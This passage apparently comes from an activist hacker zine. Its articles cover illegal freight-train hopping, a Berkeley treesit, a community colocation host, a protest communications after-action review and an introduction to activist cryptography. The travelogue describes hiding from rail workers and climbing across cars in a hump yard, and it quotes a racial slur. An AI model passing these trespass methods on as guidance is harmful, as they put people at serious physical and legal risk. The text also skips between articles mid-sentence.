She was pulled under the wheel\r\nand died. \"Man I loved that woman\", he said.\r\n\r\nWilly chimed in here and there with songs and anecdotes. After they missed an\r\nespecially promising train Willy  was visibly distressed. \"I need the therapy, I\r\nneed to get gone, be on a train for a couple of days\", he said.  You could tell\r\nthey had been spending every hour of every day together and now were as thick as\r\nLaurel and  Hardy. Mortikai told us to drop his name if we came across other\r\nhobos, and warned us of some of the violent  hobo gangs on the northern route.\r\nWe all laughed a lot and said good bye and missed our train several times.\r\n\r\nNot ten minutes after they left to go sleep in a field, we crossed the road like\r\nthey suggested, just in time to  catch our train. This time I hopped on before\r\nEvoltech even knew what was happening. Evoltech was surprised.  That night was\r\nthe most uncomfortable, freezing cold. Without cardboard to lay on my hips got\r\neven more  bruised from laying on the train floor.\r\n\r\nWe woke up the next day in Wyoming. Wyoming started off hot, dry, and dull. By\r\ndusk the air had cooled and we were driving through pale green plains and\r\nterracotta red rock outcroppings. They were stacked like haphazard dinner\r\nplates, jutting suddenly out of the mild landscape making  a surreal movie set\r\nquality. A few farm houses sat on the plains with red  rock piles dropped\r\nstraight from mars in their back yard. It was the first  sunset of the trip that\r\nI remember. Blue and pink like bubble gum ice cream.\r\n\r\nWe were dangerously low on water and planned on getting off in Cheyenne to get\r\nmore and try to catch another train into Saint Louis to visit  The Priest. We\r\nfell asleep though and woke up in the Cheyenne station with giant station houses\r\n like Disneyland castles, flying Union Pacific  flags directly on either side of\r\nus. No way to get out there. I tried to  nudge Evoltech awake but he wasn't\r\nbudging. The train picked up suddenly and I watched Cheyenne disappear fast.  \r\n\r\nAll night long the water bottle had been leaking and gathering in the back seam\r\nof the car, soaking the backpacks and the both of us as we  slept. Fortunately\r\nthis was a faster train then our last one and we had  already gone through half\r\nof Nebraska before we woke up again.\r\n\r\nI looked over the side as our train pulled up to the stop and saw that  we were\r\nparked near the end of a yard and there were corn fields on  one side, and what\r\nlooked like a good size town on the other. The train  felt like it was breaking\r\nup so I woke Evoltech up and told him this was  our chance. We scrambled to get\r\nour gear together, hopped out and  headed for the corn fields where we stripped\r\noff most our night-layers and headed into town. \r\n\r\nWe stopped at Bob's Super Store to pick up stronger water bottles- two 2 liter\r\nsoda bottles to be refilled. An  old woman stopped us in the juice isle and\r\nasked us how we were doing. \"Are y'all in a band? Are you actors  or something\",\r\nwe told her we were riding freight trains. She asked us why and we replied \"just\r\nfor fun\". She  reached out and patted my arm. I could tell she was really\r\ncurious about us. \"Well you kids have a safe trip  now.\", she smiled. Everyone\r\nin the store seemed to be over 60 and they would stop in their tracks when they\r\nsaw us, looking confused and upset. There is something wrong with a country like\r\nAmerica, where everyone  has access to media, music, movies but still act with\r\nfear and disgust when they see someone who is differ-  ent. Evoltech walked\r\npassed a table of old men staring at us, whom he overheard say \"Well at least\r\nthey're not niggers\".  \r\n\r\nWe stopped to clean up in the bathroom of a Subway restaurant. The \"sandwich\r\nartist\" was friendly and curious. We had the place to ourselves. We filled our\r\nwater jugs and left dirt rings around the sink from cleaning up.\r\n\r\nLater down by the tracks We found a perfect shady under-pass with trees in front\r\nof a row of cars. We sat on  what must have been an ant hill for hours with\r\nevery train racing past, avoiding the stares of cowboys driving  by. Evoltech\r\nwas becoming more and more anxious. The sun was starting to set, sherbet orange.\r\nA good look-  ing consist train eventually came out way. Not the coal cars we\r\nhad been seeing all day but a whole consist of  grainers. We grabbed our bags\r\nand ran for it, unbelieving, and it slowed! I ran up the raised rocks, grabbed\r\nthe handles, and jumped up. Evoltech came up after me and we ducked back into\r\nthe grainer. It chugged along  for a bout a minute and stopped right along the\r\ncars that we got off the night before. We felt the first jolt of a  hump and\r\ndecided to get off and wait. Then we saw someone coming along the tracks. A\r\nworker checking the  cars. We ducked behind some nearby horse trailers until he\r\npassed.  \r\n\r\nI chased lightning bugs as Evoltech jumped into an inter-modal 48 that had just\r\nbeen joined on and gestured  to me to join him. At the same time I saw the\r\nworker heading back down the tracks, a silhouette in a tall  cowboy hat. I tried\r\nto motion as I dove into the tall grass nearby, keeping as still as possible.\r\nTwo cars down  from where Evoltech was hiding he climbed up and looked inside\r\nwith his flashlight, then kept walking down  the line looking over his shoulder.\r\nWhen he came back up I waited for the sound of his radio to pass and saw \r\nEvoltech standing up in the car. I gestured for him to get out and hide with me\r\nin the grass. We ducked down,  getting eaten alive by mosquitoes. The worker\r\nwalked back down the line a third time. This time the cars rolled  forward and\r\nhe was perched like a cowboy masthead on the last car. We ran down the line,\r\npicked a grainer,  and climbed in. We laid there trying to steer clear of the\r\nperfectly hand-sized holes just over the wheels.  \r\n\r\nWhen we woke up we were in a yard where our train was being broken up. The\r\nshudders were violent. On either side of us were at least three more rows of\r\ntrains. We were in a hump yard. We couldn't risk walking  down the line. There\r\nwas no way of telling where we were in the yard, so we decided to carefully\r\nclimb over  the cars and walk out sideways, something we had been advised\r\nagainst for safety. We chose a direction and  ended up climbing over 5 or 6 rows\r\nof trains before we found a break. Then we were in front of a station filled \r\nwith trucks and parts. We walked down the line avoiding as many trucks as\r\npossible, but one passed us. He  must have been just a worker coming and going\r\nbecause he didn't seem to care at all.  We got out of the yard through a field,\r\npassing a No Trespassing sign and on to safety. Looking at our UP maps  We\r\nfigured out that we were in Council Bluffs, IA. We walked into town and a short\r\nwhile later a bus came that  dropped us off about three blocks from the\r\nGreyhound station. Crazy luck. \r\n\r\nAnd the train hopping part of the trip ended there. We spent a completely\r\nmiserable 38 hours on Greyhound to the east coast for HOPE 6. The rest is a\r\nstory for another time, another adventure, maybe another article to be written.\r\n\r\n[1] Hopping Freight Trains in America by Duffy Littlejohn\r\nhttp://www.zrpress.com/hoppingfreights.html\r\n\r\n################################################################################\r\n Hack This Tree: How a Treesit, Some Grandmothers and \r\n Native Remains Could Bring Down a University                         by Frenzy\r\n################################################################################\r\n\r\nA Treesit, for those unfamiliar with the concept, is the act of occupying a tree\r\nfor a political end. The first urban treesit  has been going on in Berkeley for\r\na total of 470 days (as of  March 15th 2008). The action has attracted lots of\r\nmedia atten-  tion; many have seen the sit on local and international news.\r\n\r\nUC Berkeley and it's relationship with the community of Berkeley has not been\r\ngood since the fight for people's park.  The university with a lot of political\r\nand economic pow-  er, is able to run image campaigns on a daily basis. A shift\r\nin  the student body and a increase of apathy at the campus has also contributed\r\nto the university's ability to restructure itself from a free speech university\r\nto a restricted speech area.\r\n\r\nThis particular treesit grew out of a general distaste from the community of the\r\npractices of the UC, such as  the constant harassment of activists at people's\r\npark and the continuing of nuclear weapons development. The  university decided\r\nto start laying plans to cut down most of the live oak trees in the Memorial Oak\r\nGrove, near  Memorial Stadium and build a multi-million dollar sports training\r\nfacility. Activist took to the trees to stop this  plan in December of 2006 and\r\nhave been there ever since. A few of the absurdities of the proposed area for\r\nthe  building is that it is directly on the Hayward earthquake fault, some of\r\nthe oaks they want to cut were planted in  memory of bay area soldiers who died\r\nin world war I and the site is also a suspected Native American burial ground.  \r\n\r\nAfter about 6 months of free ability to resupply those up in the trees, The\r\nUniversity erected a 7 foot tall  fence to keep people away from the grove,\r\nshortly after they erected another fence outside that one, com-  plete with\r\nbarbed wire. Both fences cost an estimated $90,000 of university money, $10,000-\r\n$12,000 for  the first, and about $80,000 for the second. Resupply actions have\r\nbeen going on with limited problems, even with the fences, a group called\r\n\"Grandmothers for The Oaks\" has been helping a lot with the process.\r\n\r\nOne of the most recent developments has been the move of a treesitter to the\r\nmiddle of campus to highlight the problems with The University. What started\r\nas a simple banner drop with the intention of leaving  resulted in a full-scale\r\ntreesit along with a police barricade around the tree. The Police have prevented\r\nfood  and water from going up into the tree in total 5 people were arrested for\r\nthrowing water to the sit. The protester, going by the name \"Fresh\" came down on\r\nMarch 14th, he was cited for illegal lodging and released. This recent action\r\nhas a lot of students who were ignoring the oak grove sit to be more involved\r\nand active.  \r\n\r\nSince December 2006 when the Treesit started the University has signed a billion\r\ndollar contract with British Petroleum in the largest corporate and public\r\nlearning institution merger to research \"biofuels\". This means that not only is\r\nUC money going to help research for private business, BP will run the projects\r\nof a public university. There are also plans to grow Genetically Engineered corn\r\nin the area, possibly contaminating people's own gardens with GE pollen.\r\n\r\nAnother situation that has increase opposition to the university is the findings\r\nof 13,000 native remains that are in storage under the women's swimming pool.\r\nCurrent estimates show that half of the campus used to be a burial ground for\r\nthe Ohlone Tribe. The Ohlone people have demanded that the university return\r\nthese remains so they can be buried in proper native fashion.\r\n\r\nAlso within this time period, ground has been broken for a new animal testing\r\nfacility, even after the university said they would not expand facilities.\r\nCommunity outrage about the testing on campus has resulted in home\r\ndemonstrations of researchers and contractors.\r\n\r\nA simple treesit involving the construction of a new sport facility has exploded\r\nin The University's face and now to a full scale discontent situation involving\r\ncommunity members and students alike. Solidarity Treesits are also going on at\r\nUC Santa Cruz against the Long Range Development Plan. Could it be a wave of\r\nchange for UC Berkeley and the UC system? We sure hope so!\r\n\r\n           To help out with the oaks go to: http://www.saveoaks.com\r\n\r\n################################################################################\r\n Community Colocation: A Legal & Financial        by Ryan Bagueros, co-founder,\r\n Firewall for Subversives and Non-Profits         San Francisco Community Colo\r\n################################################################################\r\n\r\nEvery commercial website that exists on the internet has servers hosted at a\r\ncolocation facility, or \"colo\" for short.

Every\r\ncommercial website that exists on the internet has servers hosted at a\r\ncolocation facility, or \"colo\" for  short. A colo is a large, semi-sterile, air\r\nconditioned building filled with cabinets [1]. Each cabinet contains a  power\r\nhook-up, maybe some cooling fans and anywhere from 10 to 25 rack-mounted servers\r\n[2], as opposed to the normal desktop computers used at home. The alternatives\r\nto hosting at a colo facility include  shared web hosting or hosting a machine\r\noff your home cable or DSL, both of which have severe drawbacks.\r\n\r\nColocation hosting is, by far, the best option from a technological point of\r\nview. Most colo facilities have generator power backups in case of an\r\nelectricity outage. Most of them have security guards who monitor who is going\r\nin and out of colos, and usually have the most reliable, fastest internet\r\nuplink. \r\n\r\nHowever, from a logistical point-of-view, colos present a number of challenges,\r\nespecially for non-profits or  groups expressing their right to freedom of\r\nspeech (in particular, free speech that targets the misdeeds of large\r\ncorporations or governments). It is generally the policy of all commercial\r\ncolo's to immediately comply with subpoenas, DMCA take-down complaints or any\r\nofficial-looking order from a corporate law firm or a  law enforcement agency.\r\nIn many cases, compliance is not even mandatory but the commercial colo will go\r\nalong with it just to be on the safe side - after all, their only objective is\r\nto make money, so why risk it?\r\n\r\nIn addition, most colocation facilities require a minimum commitment of half a\r\nrack and several Mb/second traffic baseline, all of which translates into costs\r\n-- generally more than a financially struggling non-profit  can afford.\r\n\r\nWith these problems in mind and driven by a philosophical belief in universal\r\ndigital access, an off-shoot of the Electronic Frontier Foundation (EFF) called\r\nOnline Policy Group was founded in 2000 with the idea of operating a colo with\r\na \"pay-as-you-can\" model, relying on grants and donations for funding. During\r\nthe six  years that the California Community Colo Project was operated by OPG,\r\nthey filled up 18 cabinets of public use and hobbyist servers. Unfortunately,\r\nthis model did not prove to be sustainable, and in December 2006 it was\r\nannounced that CCCP would be powering off all of its cabinets at Hurricane\r\nElectric in Fremont, California.\r\n\r\nBy that time, though, numerous organizations deeply rooted in the community had\r\ncome to rely on the colocation services provided by CCCP. A number of us decided\r\nthat we would continue the community colo model, with some improvements that\r\nwould make the organization more sustainable.\r\n\r\nIn December 2006, the San Francisco Community Colo was born. Our first policy\r\nchange was to get rid of the \"pay-what-you-can\" model. The SFCCP is a membership\r\nbased group where all par-  ticipants equally share the cost of uplink provider\r\nrather than just paying whatever you can (which oftentimes ended up paying\r\nnothing for months on end, sticking the organization with the bill). We also\r\nchose a more centrally-located facility in downtown San Francisco, at 6th &\r\nBrannan.\r\n\r\nSFCCP also spends a considerable amount of organizational effort preparing for\r\nattacks on the privacy of our clients. We host activist sites from all over the\r\nworld, including the West Bank, Colombia, Brazil, Venezuela. Many of the servers\r\nwe host are critical tools used in struggles of resistance against some of the\r\nmost corrupt governments in the world. For instance, we help host the pirate\r\nradio stream that is the voice of the  insurgency against the renowned corrupt\r\ngovernor of the state of Oaxaca in Mexico.\r\n\r\nWe are also keenly aware of the risks facing information technology providers in\r\nthis day and age. For instance, police in Italy served a colo provider with an\r\norder which allowed them to physically hack an activist  server and install\r\nsoftware which allowed them to monitor encrypted e-mail traffic [3] -- the ISP\r\nwas forbidden to tell their client that this compromise had occurred and the\r\npolice spied on activist e-mails for an entire year.\r\n\r\nCompare this with how a similar situation was dealt with at the California\r\nCommunity Colo. At a time when the integrity of electronic voting machines was a\r\nmatter of public debate and the leading manufacturer of voting machines in the\r\nU.S. (Diebold), had been reassuring everyone that their voting machines were \r\n\"hack-proof,\" internal Diebold communications proved otherwise. Someone hacked\r\nDiebold's mail archives and posted them on the SF Indymedia website, hosted at\r\nCCCP. We received a DMCA takedown order but because we are a community colo, not\r\na for-profit colo, we immediately took the order to sympathetic attorneys.\r\nDiebold's order was fought in court and we won -- the damning evidence against\r\nDiebold's machines would stay online and Diebold was commanded to pay legal\r\nfees and more [4].\r\n\r\nWhile it is true that ultimately the community colos are not entirely\r\nindependent from a commercial backbone provider, we provide enough bureaucratic\r\ndistance that we can intercept legal requests before they get  that far. And, as\r\nhistory has shown, this approach works. By providing a \"community network,\" we\r\nare able to throw up a line of defense against those who would suppress the\r\ninherent freedom of information that makes the internet phenomenon so\r\nmeaningful.  \r\n\r\nTherefore, the purpose of community networks like SFCCP is two-fold:\r\n1) to provide high-availability, high-quality uplinks to community groups and\r\nnon-profits at a reasonable price and 2) to provide a front line of defense\r\nagainst corporate and law enforcement interference.\r\n\r\nFinally, it's worth nothing that the SF Community Colo is largely run like any\r\nother open source or free software project. For the most part all decisions are\r\ntransparent. We even use Trac [5], traditionally used to  manage free software\r\nprojects, as our organizational software.\r\n\r\nSFCCP is constantly working on improving our security and lowering our costs.\r\nCurrent projects include distributed and redundant data storage to mitigate the\r\nimpact of the loss of a single SFCCP server. The work we're doing is cutting\r\nedge and our goal is to form a network of community colos that can take our\r\nproject to the next level.  \r\n\r\nThat said, we are in desperate need of support from the community. While we are\r\njust about fiscally solvent on our month-to-month expenses, we could use help in\r\nthe following ways:\r\n\r\n1) Human resources! We need motivated individuals who want to see a project like\r\nthis succeed and can donate some sweat and labor to the project. You can e-mail\r\nus at org@mail.sfccp.net to start getting involved.\r\n\r\n2) Technology resources! As long as the equipment isn't broken, we'll take any\r\nkind of networking gear or rack-mounted servers that you aren't using. Again,\r\nemail org@mail.sfccp.net to get in touch about this.\r\n\r\n3) Money, money, money! It's the root of all evil but we are seriously in need\r\nof outright donations or anyone who understands how we can get grants to help us\r\ncontinue our work. If you can help us out with that, please e-mail org@sfccp.net\r\n-- note that all SFCCP workers are unpaid volunteers and we dig in our own\r\npockets to pay for emergency costs.\r\n\r\n4) Start a community colo in your city! We are more than happy to help new\r\ncommunity colo's get up and  running. Please get in touch with us if you'd like\r\nour help in getting a CCP running in your city.\r\n\r\nThere are less and less spaces on the internet which are outside the reach of\r\ncorporate and law enforcement reach. The community colo movement is doing\r\neverything we can to reverse that trend. Community colos are popping up all over\r\nNorth America -- Seattle, Chicago, New York City and a new one forming in\r\nCleveland, Ohio. We hope to hear from all freedom-loving netizens who want to\r\nhelp see this project grown and succeed.  \r\n\r\nFootnotes:\r\n\r\n[1] Your typical colocation facility   http://porn.linefeed.org/web_corridor.jpg\r\n[2] Rack-mounted servers -         http://www.flickr.com/photos/sfccp/449887197/\r\n[3] Autistic attack -             http://test.edri.org/edrigram/number3.14/Italy\r\n[4] Online Policy Group v.

While the\r\nmajority of this analysis was written by CBG, it is hoped that others who can\r\nprovide their own analysis will in the comments section.\r\n\r\nIntroduction\r\nThis is an analysis of the Tin Can Collective’s attempt to provide a\r\ncommunications infrastructure for the RNC 08 protests in the Twin Cities. The\r\nanalysis is based on first hand knowledge and informal discussions witha variety\r\nof users and other participants during the 4 day long protests. Tin Can was a\r\nnew collective made up folks that had never worked together on such a project\r\nprior to the RNC 08 protests. The collective came together sometime after May\r\ngiving it about 3 months to prepare and implement the infrastructure for tens of\r\nthousands of possible users.\r\n\r\nThe Tin Can Collective\r\nThis collective was a mix of locals and people from around the country. No one\r\nin the group had experience providing a communication infrastructure on such a\r\nscale. The main body of the collective was made up of various activists with a\r\nwealth of varied experiences with protests at this scale. The collective worked\r\nvery well together despite geographic distance. The collective had very modest\r\nresources and needed to rely on donations for the equipment and money needed to\r\nset up the infrastructure. The entire thing was done a shoestring budget.\r\n\r\nTwitter/Tapatio\r\nThe backbone of the system was the use of Twitter. After much discussion it was\r\ndecided that Twitter would be more effective than other already existing\r\nnetworking software (e.g. TxtMob) and that the short period of time would make\r\nit impossible to code our own networking system. Twitter would handle the\r\nfunction of distributing sms messages to users on the streets. There was concern\r\nabout Twitter’s ability to handle the volume of messages and that some mobile\r\nphone systems could not support Twitter. There was also concern about\r\nsignificant delays, like the ones that occurred during the NYC RNC 04 protests\r\nthat used TxtMob. These problems did not occur during the RNC 08. There were\r\nvery few systems that could not utilize Twitter (the exception being pre-paid\r\nT-Mobile) and there was no noticeable delay in relaying messages despite heavy\r\nvolume. Overall Twitter worked as expected.\r\n\r\nTapatio was a new software developed for the protests. It was to be a management\r\nsystem that worked with Twitters distribution system. Tapatio was a way to\r\nfilter and generate messages. It was to be used by the collective to send out\r\nuseful sms messages to the street level users. It also allowed street users to\r\nsend sms messages to the comms team to be dispatched to the right groups and\r\nvetted. Tapatio was a complicated piece of software that managed a variety of\r\ntasks in a pretty straightforward user format. There were also some problems\r\nthat if there had been more time and greater number of practice sessions could\r\nhave been corrected.\r\n\r\n(Note from the tapatio development team: The name \"tapatio\" for this project was\r\nconcieved early in 2008 when the software was in it’s early design phase.\r\nHackbloc developers were tired of the naming conventions that were already in\r\nuse (famous anarchists or penguin types for computers, choice beverages for code\r\nprojects, etc). The naming convention that was decided on was hot sauces, and\r\nthe sauce that was on the tip of everybody’s toungue after dinner that night was\r\ntapatio. Tapatio has been released as a Drupal module. All releases are\r\navailable at http://drupal.org.project/tapatio.)\r\n\r\nWhat worked\r\n* Tapatio was successful in dividing messages effectively among various user\r\ngroups. There were a total of about 17 user groups ranging from 7 sector groups\r\nto a food group. This system worked and all user groups were able to get\r\nmessages directed at their interests.\r\n* Tapatio allowed for successful filtering of undispatched and dispatched\r\nmessages. This system could filter messages a variety of ways from date, type,\r\ndispatched/undispatched, etc. This system also allowed all sms messages to be\r\nlooked at by a variety of operators before being sent out and even after\r\nmessages were sent out.\r\n* The automatic date and time stamp also worked well in helping to organize the\r\nmessages and determining their relevance.\r\n* Each message had a user name attached to help verify information and seek out\r\nfurther clarification and this was also quite helpful.\r\n* The system allowed individuals to choose what user groups they wanted to\r\nbelong to and unsubscribe on their own. Thus effectively decentralizing the flow\r\nof information.\r\n* Tapatio worked pretty well at receiving sms from the street, awaiting vetting\r\nand being sent out.\r\n* The verification sections (e.g. select group) stopped poor or undifferentiated\r\nmessages going out.\r\n\r\nWhat could be improved upon\r\n* Picking shorter and easy names for user-groups to ease registration for those\r\nunfamiliar with Twitter. Most namely not using confusing words or symbols like\r\n\"_\" .\r\n* Allow for the deleting in batches in messages that would not be sent out, as\r\nopposed to each individual message with a further click for verification. This\r\ntook a substantial amount of time to delete messages.\r\n* Have the Title field and the message field linked to avoid copying and\r\npasting, which also added to the time of sending out messages. Nearly 90% of the\r\nmessages had identical titles and messages.\r\n\r\n* Design the front page better:\r\n  1. Allow all groups to be seen without scrolling.\r\n  2. Allow a check box system to click groups (as opposed to a cntrl click)\r\n  3. An option to select all groups\r\n  4. Shrink \"Body\" section and change it to \"Notes\" to make it more clear.\r\n  5. Create some simple macros (e.g. Police) for the message section\r\n* It was planned but never implemented the \"Info, Warning or Emergency\"\r\ndesignations (yet was needed to send out a message thus adding another two\r\nclicks to dispatch). The idea of this is good and should be implemented. The\r\nhope that people could choose if they wanted all messages or just emergencies\r\nwould add to the userability and make this designation useful.\r\n* The Rating system, including the pre-weighted votes (e.g. Scouts) and adding\r\nvotes never actually worked and thus were bypasssed. It was easy to do and thus\r\ndid not slow down or interfere with the dispatching of messages but could either\r\nbe improved upon or removed.\r\n* De-duplication was like the Rating system in that it was ignored. It did work\r\nhowever but because it was counter-intuitive it was not practical. The inability\r\nto delete in batches created long lists of messages and thus scrolling to find\r\nthe duplicate message/s took longer than retyping a sending out a fresh message\r\nit was not used. It also deleted the message you were looking at keeping the one\r\nfrom the list, which is counter intuitive. Also the newer message often had\r\nbetter info and thus should be the one kept and the one from the scroll list\r\nshould be the one deleted.\r\n* Most of the flaws in the system were minor and over all Tapatio was a success.\r\n(Note from the tapatio development team: Each of these feature requests are\r\nbeing worked on as this goes to press. Always check\r\nhttp://drupal.org/project/tapatio for the current release. Information about\r\nthis project and other communications software written by the hackbloc team can\r\nbe found at http://comms.hackbloc.org)\r\n\r\nScouts & Operators\r\nIn addition to the collective, there were individuals who agreed to work as\r\nvolunteer scouts and operators. Scouts were people on the streets providing\r\ninformation to comms and willing to be dispatched to areas where there were no\r\nscouts but reports were coming in. Scouts were to have increased reliability and\r\nfor the most part this seemed to be true. Though the Rating/voting system did\r\nnot work operators simply dispatched scout info without verification for the\r\nmost part and this worked quite well. Operators were the ones answering the\r\nphone, writing sms and dispatching other sms messages to the street.\r\n\r\nWe had enough of both for at least the first day and the people seemed to take\r\ntheir tasks seriously and do them well. Both types of trainings (Scout and\r\nOperators). Both operators and scouts added to the overall success of the\r\nproject and did a great job.\r\n\r\nThe trainings for both groups could have been better and more organized,\r\nespecially the operators. The average training time was about 30 minutes, with\r\nabout 6-12 participants. The vouch system seemed to work for both scouts and\r\noperators and there was not shortage of either. The vouch system was a success.\r\nAsking people to pre-register for scouts and operators on-line was not a success\r\nwith only one or two people bothering to fill it out.\r\n\r\nThings that could be done better would include greater preparation in trainings.\r\nIn the future, having sign-in sheets with phone numbers, handles, type of scout\r\n(bike, foot, connected with an affinity group, floating, etc.) and times working\r\nwould be useful. These could be easily encrypted and provide security for those\r\nvolunteering but allowing comms to keep track of folks. Having better advertised\r\nmeetings would also be useful, since we are using a vouch system that requires a\r\nbit of front end work.\r\n\r\nSKYPE & Texting\r\nUsing Skype was a good alternative to using cell-phones and/or landlines. It\r\nprovides greater security since it can be purchased cheaply and anonymously..\r\nWe did have one landline, but could have just as easily used another Skype\r\naccount and it would have been just as good. The roll over function for Skype\r\nis superior to both landlines and cellphones and worked perfectly. The contact\r\nbook also allowed us to know who was calling in (e.g. Scout) and prioritize\r\ncalls. Skype also allowed people to remain at the computer and work on tapatio\r\n(and look at other information web-sites) while receiving calls. Having a \"back-\r\ndoor\" number was crucial to give to scouts and other groups (e.g. Legal office).\r\nThe back-door number is a different and less used than the public number which\r\ncould have been more widely distributed.\r\n\r\nPerhaps the biggest lesson was that most people, including scouts, will call in\r\nnot text in information. This makes sense for a variety of reasons. First calls\r\nfor the most part faster, people can speak info faster than using a non-qwerty\r\nkeyboard for texting. Second, people like to be looking around when relaying\r\ninfo and again this is much easier when not looking at a little screen and\r\nkeyboard. Lastly, calls, as opposed to texts, allow the operators to ask\r\nclarifying questions. The disadvantage of calls is that it is sometimes hard to\r\nhear with the noise of the street and the office. It is worth investing in\r\nquality headsets with adjustable volume for operators.\r\n\r\nOffice Set-Up\r\nIt was valuable to have an office where everyone working as operators were in\r\nshouting distance so decisions could be made quickly and information shared. It\r\nwas crucial that all work stations have a useful map, list of backdoor numbers\r\nto other groups, notebooks and other items to organize information as it comes\r\nin and goes out. Limiting the number of people in the office to the bare minimum\r\nwill help greatly to reduce noise and make the work more effective. Some type of\r\nsound dividers between operators would also be useful. Overall the office ran\r\nefficiently and dispatched hundreds of messages in a few hours.\r\n\r\nIt is possible to set up an office anywhere, even remotely. Having a centralized\r\noffice to the action was counter-productive (see security section).\r\n\r\nFM Radio\r\nEven though the FM radio never got off the ground due to one group pulling out\r\nand another being sabotaged, it was still unlikely that it would have been\r\neffective. The number of FM radios has dropped considerably over the years and\r\npeople often do not want to bring extra materials on the street during a\r\nprotest. It also requires a high risk for individuals and equipment with very\r\nlimited use. Specifically in cities where there is a lot of RF and line of sight\r\nproblems it is unlikely that FM radio could serve as an effective backup comms\r\nsystem.\r\n\r\nSecurity\r\nThough their was a conscious attempt to be secure there were places where Tin\r\nCan could have done better. Though the location of the office was kept from the\r\npublic there were still too many people who did not need to know where it was\r\nthat knew. The only people that need to know where the office(like operators)\r\nshould have that information. Encrypting operator and scout lists would have\r\nbeen simple and improved the security of everyone involved. The greater use of\r\npre-paid phones by users would have also aided security of individuals. The\r\nprice has come done considerably on these phones making them economically\r\navailable to most activists. Understanding that comms can be targeted by law\r\nenforcement would suggest that ordinary personal security be increased like\r\nmaking sure cell-phones are clean, not keeping sketchy stuff on you while at the\r\noffice, observing security culture in conversations with others, etc. Having\r\nsomeone/s staying in the office would also protect it from being bugged or\r\notherwise compromised. Though it was discussed but never implemented using web-\r\ncams for security outside the office could be useful in the future allowing\r\nfolks inside the office to see what is going on outside and collect evidence of\r\nillegal conduct of the police during a raid.\r\n\r\nBack-Up\r\nThe raid on the comms office, highlighted the need to have a back-up system that\r\ncan be ready to go if one node gets shut down. Comms was able to get back up but\r\nit took some time and at a seriously diminished capacity. Having people and\r\nequipment ready to go in case of a shut down would have made the transition and\r\nthe fluid functioning of the comms infrastructure much easier and more useful.\r\n\r\nUser Feedback\r\n* Many people chose not to use the system for security concerns. Tin Can could\r\nhave done better to explain the realistic concerns and explained how cheap track\r\nphones could alleviate these concerns. Whenever a new technology is used there\r\nare those concerns and Tin Can should address them up-front.\r\n* The folks that only subscribed to Sector groups found the information very\r\nuseful and the flow of messages manageable. Those that signed up for many groups\r\nwere swamped with messages and received quite a number of duplicates. Certain\r\ngroups should have been limited like Police Activity that could have sent only\r\ninformation from scanners and not street reports. Groups like food were under\r\nutilized and probably not needed. The bike group was also under utilized and\r\ncould have been removed. Medics had there own comm system and thus did not use\r\nours very much and thus it could have been removed, without much of an effect.\r\nDue to the decentralized nature of the actions the roaming squa group received a\r\nlot of messages, often for places far away from any individual group. It is\r\nunclear how to remedy this for future actions that are decentralized and\r\nutilizes flying squads. The other groups seemed to work. It might be better to\r\nswitch the comms group name to the scouts to make clear what kind of information\r\nit contains.\r\n\r\n* Integration with other groups was a mixed bag. Comms and legal did well in\r\ncoordinating messages and mutual verification. Medics had their own dispatch\r\nproblems and were fairly disconnected to the comms groups. Between these two\r\nextremes most of the other groups had periodic connections that seemed to serve\r\nboth comms and the individual groups well. Better use of backdoor communications\r\nand a dedicated \"verifier\" (an operator or two who was in routine communication\r\nwith other groups and building relationships with them) could be very valuable.\r\n* Scouts seemed to find the system to be very valuable to their work and felt\r\ntheir messages were sent out in a timely fashion. This was probably the greatest\r\nsuccess of the comms network. The use of the backdoor made dispatching and\r\nverification easy and timely. Scouts provided useful reports on every hotspot\r\nduring the duration of the comms network. The use of cellphones as oppossed to\r\nwalkie-talkies seriously reduced the police’s ability to target scouts. Only one\r\nscout got arrested during both days of actions, which is much different than\r\nprevious mobilizations where walkie talkies were used. Since cell-phones are\r\neverywhere scouts do not stick out using them. It also reduces the up-front\r\ncosts for such a network in that even track phones are much cheaper than good\r\ntwo-way radios and have a much better clarity and range (not to mention text\r\ncapabilities).\r\n* The comms did a good job of rumor control. The use of multiple verification\r\nhelped significantly reduce the number of rumors being sent out as info. In the\r\nfew instances where incorrect information was dispatched corrections immediately\r\nfollowed. The presence of comms also reduced the word-of-mouth rumors that\r\nnormally plague such confusing actions. People waited to get info from comms and\r\nother sources before believing rumors and misinformation and thus reduced their\r\neffects.\r\n\r\nSummary\r\nDespite the obstacles of the raid, the comms infrastructure for the RNC 08\r\nprotests was a success and suggests a new way forward for these types of\r\nmobilizations. The software works but could use some changes to make it more\r\neffective. The ratings system needs to be further developed to truly utilize the\r\n\"wisdom of the crowds\" phenomena turning everyone with a cell phone into a\r\nscout. Comms can increase its usefulness but rethinking user groups and making\r\nbetter connections with already existing groups to make sure information is\r\nreadily available, manageable and verified. Allowing users to select the type of\r\ninformation they want (for example: info, warning or emergency) will reduce the\r\namount of information users will have. Greater emphasis on the human-side of\r\ncomms like training, security and reach out need to more emphasis during future\r\nmobilizations. The Tin Can model has addressed most of the problems of earlier\r\ncommunication systems and with some minor revisions could be an important tool\r\nin aiding the success of large mobilizations.\r\n\r\n################################################################################\r\n Cryptographic Education for the Militant Activist       by Nomenumbra[0x00SEC]\r\n################################################################################\r\n\r\n[0x01] Introduction\r\nGreetings and welcome to this first, short, installment of Cryptographic\r\nEducation for The Militant activist. With these series of articles, to be\r\npublished in future HackThisZine issues, I hope to educate (h)ac(k)tivists in\r\nthe elementary basics of cryptography as to enhance their capability to defend\r\ntheir information from the prying eyes of governemental fascists and other\r\nunwanted entities.  \r\n\r\nThis installment will be an introduction to Shannon confusion and diffusion,\r\nelementary cryptographic design principles and the merkle-hellman cryptosystem,\r\na flawed but greatly educational assymetric cryptosystem. Instead of trying to\r\nmake full-blown mathematicians out of all of you i'd like to take a more\r\npractical approach, since activism is practice after all.\r\n\r\nThis does not, however, mean that it won't contain fairly advanced mathematics.\r\nOf course, anyone with a bit of a math-knack or a formal education in the fields\r\nof logic, group and set theory and general mathematics should be able to\r\nunderstand this document. I can't press the necessity of cryptography and\r\nsecurity culture enough, especially when it comes to civil disobedience and\r\ndirect action.\r\n\r\nGovernemental agencies heavily rely on both wiretapping and interception of\r\ndocuments. Of course these agencies also have enough expertise to break almost\r\nevery homemade code you designed (unless you have access to a very skilled\r\nmathematician :p) but if designed properly, it will take them either a long time\r\n(long  enough to continue with the action without them using that information\r\nagainst you) or too long to be efficient and they'll leave the document and try\r\nother ways.  \r\n\r\nNow, this encryption should be applied to schematics, blueprints, maps and\r\ninstructional documents that are essential to operational activities and\r\ndocuments that are carried by the activists. The .gov will try to pressure\r\nactivists into giving them the key, so in order to avoid this problem strict\r\nsecurity culture should be practiced and each document should be encrypted with\r\na 